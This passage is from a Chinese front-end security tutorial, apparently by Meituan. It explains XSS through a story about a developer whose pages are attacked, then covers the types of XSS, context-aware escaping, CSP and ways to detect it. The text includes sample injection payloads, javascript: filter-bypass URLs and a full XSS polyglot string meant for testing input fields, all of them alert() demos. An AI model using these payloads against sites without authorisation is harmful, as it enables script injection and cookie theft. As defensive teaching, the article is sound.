								<!----> <!----></a> <span class="date" style="margin:0 15px" data-v-81187e68><i aria-label="图标: clock-circle" class="anticon anticon-clock-circle" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="clock-circle" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"></path><path d="M686.7 638.6L544.1 535.5V288c0-4.4-3.6-8-8-8H488c-4.4 0-8 3.6-8 8v275.4c0 2.6 1.2 5 3.3 6.5l165.4 120.6c3.6 2.6 8.6 1.8 11.2-1.7l28.6-39c2.6-3.7 1.8-8.7-1.8-11.2z"></path></svg></i>2018-10-09 11:00:18
							</span> <span class="review" style="margin-right:15px" data-v-81187e68><i aria-label="图标: fire" class="anticon anticon-fire" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="fire" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M834.1 469.2A347.49 347.49 0 0 0 751.2 354l-29.1-26.7a8.09 8.09 0 0 0-13 3.3l-13 37.3c-8.1 23.4-23 47.3-44.1 70.8-1.4 1.5-3 1.9-4.1 2-1.1.1-2.8-.1-4.3-1.5-1.4-1.2-2.1-3-2-4.8 3.7-60.2-14.3-128.1-53.7-202C555.3 171 510 123.1 453.4 89.7l-41.3-24.3c-5.4-3.2-12.3 1-12 7.3l2.2 48c1.5 32.8-2.3 61.8-11.3 85.9-11 29.5-26.8 56.9-47 81.5a295.64 295.64 0 0 1-47.5 46.1 352.6 352.6 0 0 0-100.3 121.5A347.75 347.75 0 0 0 160 610c0 47.2 9.3 92.9 27.7 136a349.4 349.4 0 0 0 75.5 110.9c32.4 32 70 57.2 111.9 74.7C418.5 949.8 464.5 959 512 959s93.5-9.2 136.9-27.3A348.6 348.6 0 0 0 760.8 857c32.4-32 57.8-69.4 75.5-110.9a344.2 344.2 0 0 0 27.7-136c0-48.8-10-96.2-29.9-140.9zM713 808.5c-53.7 53.2-125 82.4-201 82.4s-147.3-29.2-201-82.4c-53.5-53.1-83-123.5-83-198.4 0-43.5 9.8-85.2 29.1-124 18.8-37.9 46.8-71.8 80.8-97.9a349.6 349.6 0 0 0 58.6-56.8c25-30.5 44.6-64.5 58.2-101a240 240 0 0 0 12.1-46.5c24.1 22.2 44.3 49 61.2 80.4 33.4 62.6 48.8 118.3 45.8 165.7a74.01 74.01 0 0 0 24.4 59.8 73.36 73.36 0 0 0 53.4 18.8c19.7-1 37.8-9.7 51-24.4 13.3-14.9 24.8-30.1 34.4-45.6 14 17.9 25.7 37.4 35 58.4 15.9 35.8 24 73.9 24 113.1 0 74.9-29.5 145.4-83 198.4z"></path></svg></i>
							</span> <!----> <!----></div></div> <div class="artical-body" data-v-81187e68><div class="payread-panel" data-v-81187e68><div id="tinymce-editor" class="content-detail" data-v-81187e68><div><h2>前端安全    <br></h2><p><b style="color:#00b050">随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。</b></p><p>近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端人员在日常开发中不断预防和修复安全漏洞。本文是该系列的第一篇。</p><p>本文我们会讲解 XSS ，主要包括：</p><blockquote><p>1.XSS 攻击的介绍</p><p>2.XSS 攻击的分类</p><p>3.XSS 攻击的预防和检测</p><p>4.XSS 攻击的总结</p><p>5.XSS 攻击案例</p></blockquote><h2> XSS 攻击的介绍 </h2><p>在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确：</p><p>1.XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</p><p>2.所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</p><p>如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。</p><h3> XSS 漏洞的发生和修复 </h3><p>XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。</p><h3> 一个案例 </h3><p>某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：</p><pre><code> &lt; input   type = "text"   value = "&lt;%= getParameter("  keyword ") %> "><br> &lt; button > 搜索 &lt;/ button > <br> &lt; div > <br>  您搜索的关键词是： &lt; %=   getParameter (" keyword ") %> <br> &lt;/ div > <br></code></pre><p>然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：</p><p><code><a href="http://xxx/search?keyword=">http://xxx/search?keyword=</a>">&lt;script>alert('XSS');&lt;/script></code></p><p>小明带着一种不祥的预感点开了这个链接 [请勿模仿，确认安全的链接才能点开] 。果然，页面中弹出了写着"XSS"的对话框。</p><blockquote>    <p>可恶，中招了！小明眉头一皱，发现了其中的奥秘：</p></blockquote><p>当浏览器请求 <code><a href="http://xxx/search?keyword=">http://xxx/search?keyword=</a>">&lt;script>alert('XSS');&lt;/script></code> 时，服务端会解析出请求参数 <code>keyword</code>，得到 <code>">&lt;script>alert('XSS');&lt;/script></code>，拼接到 HTML 中返回给浏览器。形成了如下的    HTML：</p><pre><code> &lt; input   type = "text"   value = "" >  &lt; script >  alert( 'XSS' );  &lt;/ script > "><br> &lt; button > 搜索 &lt;/ button > <br> &lt; div > <br>  您搜索的关键词是："> &lt; script >  alert( 'XSS' );  &lt;/ script > <br> &lt;/ div > <br></code></pre><p>浏览器无法分辨出 <code>&lt;script>alert('XSS');&lt;/script></code> 是恶意代码，因而将其执行。</p><p>这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。</p><p>面对这种情况，我们应该如何进行防范呢？</p><p>其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。</p><p>聪明的小明很快找到解决方法，把这个漏洞修复：</p><pre><code> &lt; input   type = "text"   value = "&lt;%= escapeHTML(getParameter("  keyword ")) %> "><br> &lt; button > 搜索 &lt;/ button > <br> &lt; div > <br>  您搜索的关键词是： &lt; %=   escapeHTML ( getParameter (" keyword ")) %> <br> &lt;/ div > <br></code></pre><p><code>escapeHTML()</code> 按照如下规则进行转义：</p><p>|字符|转义后的字符|    <br>|-|-|    <br>|<code>&</code>|<code>&ampamp;</code>|    <br>|<code>&lt;</code>|<code>&amplt;</code>|    <br>|<code>></code>|<code>&ampgt;</code>|    <br>|<code>"</code>|<code>&ampquot;</code>|    <br>|<code>'</code>|<code>&amp#x27;</code>|    <br>|<code>/</code>|<code>&amp#x2F;</code>|</p><p>经过了转义函数的处理后，最终浏览器接收到的响应为：</p><pre><code> &lt; input   type = "text"   value = "&ampquot;&ampgt;&amplt;script&ampgt;alert(&amp#x27;XSS&amp#x27;);&amplt;&amp#x2F;script&ampgt;" > <br> &lt; button > 搜索 &lt;/ button > <br> &lt; div > <br>  您搜索的关键词是：&ampquot;&ampgt;&amplt;script&ampgt;alert(&amp#x27;XSS&amp#x27;);&amplt;&amp#x2F;script&ampgt;<br> &lt;/ div > <br></code></pre><p>恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。</p><p>通过这个事件，小明学习到了如下知识：</p><blockquote><p>通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。</p><p>攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。</p><p>攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。</p><p>通过 HTML 转义，可以防止 XSS 攻击。 [事情当然没有这么简单啦！请继续往下看] 。</p></blockquote><h3> 注意特殊的 HTML 属性、JavaScript API </h3><p>自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。</p><p>但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。</p><p>不久，小明又收到安全组的神秘链接：<code><a href="http://xxx/?redirect_to=javascript:alert">http://xxx/?redirect_to=javascript:alert</a>('XSS')</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p><p>小明打开对应页面的源码，发现有以下内容：</p><pre><code> &lt; a href = "&lt;%= escapeHTML(getParameter("  redirect_to ")) %> ">跳转... &lt;/ a > <br></code></pre><p>这段代码，当攻击 URL 为 <code><a href="http://xxx/?redirect_to=javascript:alert">http://xxx/?redirect_to=javascript:alert</a>('XSS')</code>，服务端响应就成了：</p><pre><code> &lt; a href = "javascript:alert(&amp#x27;XSS&amp#x27;)" > 跳转... &lt;/ a > <br></code></pre><p>虽然代码不会立即执行，但一旦用户点击 <code>a</code> 标签时，浏览器会就会弹出“XSS”。</p><blockquote>    <p>可恶，又失策了…</p></blockquote><p>在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。</p><p>原来不仅仅是特殊字符，连 <code>javascript:</code> 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。</p><p>小明眉头一皱，想到了解决办法：</p><pre><code> // 禁止 URL 以 "javascript:" 开头 <br>xss = getParameter( "redirect_to" ).startsWith( 'javascript:' );<br> if  (!xss) {<br>  &lt;a href= "&lt;%= escapeHTML(getParameter(" redirect_to "))%>" ><br>    跳转...<br>  &lt;/a><br>}  else  {<br>  &lt;a href= "/404" ><br>    跳转...<br>  &lt;/a><br>}<br></code></pre><p>只要 URL 的开头不是 <code>javascript:</code>，就安全了吧？</p><p>安全组随手又扔了一个连接：<code><a href="http://xxx/?redirect_to=jAvascRipt:alert">http://xxx/?redirect_to=jAvascRipt:alert</a>('XSS')</code></p><blockquote>    <p>这也能执行？…..好吧，浏览器就是这么强大。</p></blockquote><p>小明欲哭无泪，在判断 URL 开头是否为 <code>javascript:</code> 时，先把用户输入转成了小写，然后再进行比对。</p><p>不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接：</p><p><code><a href="http://xxx/?redirect_to=%20javascript:alert">http://xxx/?redirect_to=%20javascript:alert</a>('XSS')</code></p><p><code>%20javascript:alert('XSS')</code> 经过 URL 解析后变成 <code>javascript:alert('XSS')</code>，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。</p><p>最终，小明选择了白名单的方法，彻底解决了这个漏洞：</p><pre><code> // 根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等 <br>allowSchemes = [ "http" ,  "https" ];<br><br>valid = isValid(getParameter( "redirect_to" ), allowSchemes);<br><br> if  (valid) {<br>  &lt;a href= "&lt;%= escapeHTML(getParameter(" redirect_to "))%>" ><br>    跳转...<br>  &lt;/a><br>}  else  {<br>  &lt;a href= "/404" ><br>    跳转...<br>  &lt;/a><br>}<br></code></pre><p>通过这个事件，小明学习到了如下知识：</p><p>1.做了 HTML 转义，并不等于高枕无忧。</p><p>2.对于链接跳转，如 <code>&amplt;a href="xxx"</code> 或 <code>location.href="xxx"</code>，要检验其内容，禁止以 <code>javascript:</code> 开头的链接，和其他非法的 scheme。</p><h3> 根据上下文采用不同的转义规则 </h3><p>某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：</p><pre><code>&lt; script >  <br> var  initData =   &lt; %=   data.toJSON () %> <br>&lt;/ script > <br></code></pre><p>插入 JSON 的地方不能使用 <code>escapeHTML()</code>，因为转义 <code>"</code> 后，JSON 格式会被破坏。</p><p>但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的：</p><p>1.当 JSON 中包含 <code>U+2028</code> 或 <code>U+2029</code> 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。</p><p>2.当 JSON 中包含字符串 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 <code>&lt;script></code> 标签等方法就可以完成注入。</p><p>于是我们又要实现一个 <code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p><p>转义规则如下：</p><p>|字符|转义后的字符|    <br>|-|-|    <br>|<code>U+2028</code>|<code>\u2028</code>|    <br>|<code>U+2029</code>|<code>\u2029</code>|    <br>|<code>&lt;</code>|<code>\u003c</code>|</p><p>修复后的代码如下：</p><pre><code> &lt; script >  <br> var  initData =   &lt; %=   escapeEmbedJSON ( data.toJSON ()) %> <br></code></pre><p>通过这个事件，小明学习到了如下知识：</p><p>1.HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。</p><p>2.应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。</p><h3> 漏洞总结 </h3><p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p><blockquote><p>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</p><p>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</p><p>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</p><p>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</p><p>在 onload、onerror、onclick 等事件中，注入不受控制代码。</p><p>在 style 属性和标签中，包含类似 <code>background-image:url("javascript:…");</code> 的代码（新版本浏览器已经可以防范）。</p><p>在 style 属性和标签中，包含类似 <code>expression(…)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</p></blockquote><p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p><h2> XSS 攻击的分类 </h2><p>通过上述几个例子，我们已经对 XSS 有了一些认识。</p><h3> 什么是 XSS </h3><p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p><p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p><p>而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p><p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p><p>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</p><p>不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p><blockquote><p>来自用户的 UGC 信息</p><p>来自第三方的链接</p><p>URL 参数</p><p>POST 参数</p><p>Referer （可能来自不可信的来源）</p><p>Cookie （可能来自其他子域注入）</p></blockquote><h3> XSS 分类 </h3><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p><p>|类型|存储区|插入点|    <br>|-|-|    <br>|存储型 XSS|后端数据库|HTML|    <br>|反射型 XSS|URL|HTML|    <br>|DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript|</p><p>存储区：恶意代码存放的位置。</p><p>插入点：由谁取得恶意代码，并插入到网页上。</p><h3> 存储型 XSS </h3><p>存储型 XSS 的攻击步骤：</p><p>1.攻击者将恶意代码提交到目标网站的数据库中。</p><p>2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</p><p>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</p><p>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p><h3> 反射型 XSS </h3><p>反射型 XSS 的攻击步骤：</p><p>1.攻击者构造出特殊的 URL，其中包含恶意代码。</p><p>2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</p><p>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</p><p>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p><p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p><h3> DOM 型 XSS </h3><p>DOM 型 XSS 的攻击步骤：</p><p>1.攻击者构造出特殊的 URL，其中包含恶意代码。</p><p>2.用户打开带有恶意代码的 URL。</p><p>3.用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</p><p>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h2> XSS 攻击的预防 </h2><p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p><p>1.攻击者提交恶意代码。</p><p>2.浏览器执行恶意代码。</p><p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p><h3> 输入过滤 </h3><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p><p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p><p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？</p><p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code>5 &amplt; 7</code>。</p><p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p><p>这里的“并不确定内容要输出到哪里”有两层含义：</p><p>1.用户的输入内容可能同时提供给前端和客户端，而一旦经过了<code>escapeHTML()</code>，客户端显示的内容就变成了乱码( <code>5 &amplt; 7</code> )。</p><p>2.在前端中，不同的位置所需的编码也不同。</p><p>当 <code>5 &amplt; 7</code> 作为 HTML 拼接页面时，可以正常显示：<span style="font-size:13px">&lt; div   title = "comment" > 5 &amplt; 7 &lt;/ div >。</span></p><p>当 <code>5 &amplt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。</p><p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p><p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p><p>既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p><p>1.防止 HTML 中出现注入。</p><p>2.防止 JavaScript 执行时，执行恶意代码。</p><h3> 预防存储型和反射型 XSS 攻击 </h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p><p>预防这两种漏洞，有两种常见做法：</p><p>1.改成纯前端渲染，把代码和数据分隔开。</p><p>2.对 HTML 做充分转义。</p><h3> 纯前端渲染 </h3><p>纯前端渲染的过程：</p><p>1.浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</p><p>2.然后浏览器执行 HTML 中的 JavaScript。</p><p>3.JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</p><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p><p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p><h3> 转义 HTML </h3><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p><p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>& &lt; > " ' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p><p>|XSS 安全漏洞|简单转义是否有防护作用|    <br>|-|-|    <br>|HTML 标签文字内容|有|    <br>|HTML 属性值|有|    <br>|CSS 内联样式|无|    <br>|内联 JavaScript|无|    <br>|内联 JSON|无|    <br>|跳转链接|无|</p><p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p><p>例如 Java 工程里，常用的转义库为 <code>org.owasp.encoder</code>。以下代码引用自 org.owasp.encoder 的官方说明。</p><pre><code> &lt;!-- HTML 标签内文字内容 --> <br> &lt; div >  &lt; %=   Encode.forHtml ( UNTRUSTED ) %>  &lt;/ div > <br><br> &lt;!-- HTML 标签属性值 --> <br> &lt; input   value = "&lt;%= Encode.forHtml(UNTRUSTED) %>"  /> <br><br> &lt;!-- CSS 属性值 --> <br> &lt; div   style = "width:&lt;= Encode.forCssString(UNTRUSTED) %>" > <br><br> &lt;!-- CSS URL --> <br> &lt; div   style = "background:&lt;= Encode.forCssUrl(UNTRUSTED) %>" > <br><br> &lt;!-- JavaScript 内联代码块 --> <br> &lt; script >  <br>   var  msg =  "&lt;%= Encode.forJavaScript(UNTRUSTED) %>" ;<br>  alert(msg);<br>  &lt;/ script > <br> &lt;!-- JavaScript 内联代码块内嵌 JSON --> <br> &lt; script >  <br> var  __INITIAL_STATE__ =  JSON .parse( '&lt;%= Encoder.forJavaScript(data.to_json) %>' );<br>  &lt;/ script > <br> &lt;!-- HTML 标签内联监听器 --> <br> &lt; button <br>   onclick = "alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %>');" > <br>  click me<br> &lt;/ button > <br> &lt;!-- URL 参数 --> <br> &lt; a   href = "/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %>&order=1#top" > <br> &lt;!-- URL 路径 --> <br> &lt; a   href = "/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %>" > <br> &lt;!--<br>  URL.<br>  注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等<br>--> <br> &lt; a   href = '&lt;%=<br>  urlValidator.isValid(UNTRUSTED) ?<br>    Encode.forHtml(UNTRUSTED) :<br>    "/404"<br>%>' > <br>  link<br> &lt;/ a > <br></code></pre><p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。</p><h3> 预防 DOM 型 XSS 攻击 </h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a></code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>    等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><pre><code> &lt;!-- 内联事件监听器中包含恶意代码 --> <br> &lt; img   onclick = "UNTRUSTED"   onerror = "UNTRUSTED"   src = "data:image/png," > <br> &lt;!-- 链接内包含恶意代码 --> <br> &lt; a   href = "UNTRUSTED" > 1 &lt;/ a > <br> &lt; script >  <br> // setTimeout()/setInterval() 中调用恶意代码 <br>setTimeout( "UNTRUSTED" )<br>setInterval( "UNTRUSTED" )<br> // location 调用恶意代码 <br>location.href =  'UNTRUSTED' <br> // eval() 中调用恶意代码 <br> eval ( "UNTRUSTED" )<br>  &lt;/ script > <br></code></pre><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p><h2> 其他 XSS 防范措施 </h2><p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p><h3> Content Security Policy </h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p><blockquote><p>禁止加载外域代码，防止复杂的攻击逻辑。</p><p>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</p><p>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</p><p>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</p><p>合理使用上报可以及时发现 XSS，利于尽快修复问题。</p></blockquote><p>关于 CSP 的详情，请关注前端安全系列后续的文章。</p><h3> 输入内容长度控制 </h3><p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p><h3> 其他安全措施</h3><p>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</p><p>验证码：防止脚本冒充用户提交危险操作。</p><h2> XSS 的检测 </h2><p>上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？</p><p>经过一番搜索，小明找到了两个方法：</p><p>1.使用通用 XSS 攻击字符串手动检测 XSS 漏洞。</p><p>2.使用扫描工具自动检测 XSS 漏洞。</p><p>在<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" ref="">Unleashing an Ultimate XSS Polyglot</a>一文中，小明发现了这么一个字符串：</p><pre><code>jaVasCript: /*-/*`/*\`/*'/*"/**/ ( /* */ oNcliCk=alert() ) //%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!>\x3csVg/&lt;sVg/oNloAd=alert()//>\x3e <br></code></pre><p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>、<code>Function()</code>、<code>innerHTML</code>、<code>document.write()</code> 等 DOM 型 XSS    漏洞，并且能绕过一些 XSS 过滤器。</p><p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p><pre><code>http ://xxx/search?keyword=jaVasCript %3 A %2 F*- %2 F* %60  %2 F* %60  %2 F* %27  %2 F* %22  %2 F** %2 F( %2 F* %20 * %2 FoNcliCk %3 Dalert() %20 ) %2 F %2 F %250 D %250 A %250 d %250 a %2 F %2 F %3 C %2 FstYle %2 F %3 C %2 FtitLe %2 F %3 C %2 FteXtarEa %2 F %3 C %2 FscRipt %2 F--! %3 E %3 CsVg %2 F %3 CsVg %2 FoNloAd %3 Dalert() %2 F %2 F %3 E %3 E<br></code></pre><p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 <a href="https://github.com/Arachni/arachni">Arachni</a>、<a href="https://github.com/mozilla/http-observatory/">Mozilla HTTP Observatory</a>、<a href="https://github.com/andresriancho/w3af">w3af</a> 等。</p><h2> XSS 攻击的总结 </h2><p>我们回到最开始提出的问题，相信同学们已经有了答案：</p><p>1.XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</p><p>不正确。因为：</p><blockquote><p>防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。</p><p>转义应该在输出 HTML 时进行，而不是在提交用户输入时。</p></blockquote><p>2.所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</p><blockquote>    <p>不正确。        <br>不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。        <br>业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p></blockquote><p>整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。</p><p>虽然很难通过技术手段完全避免 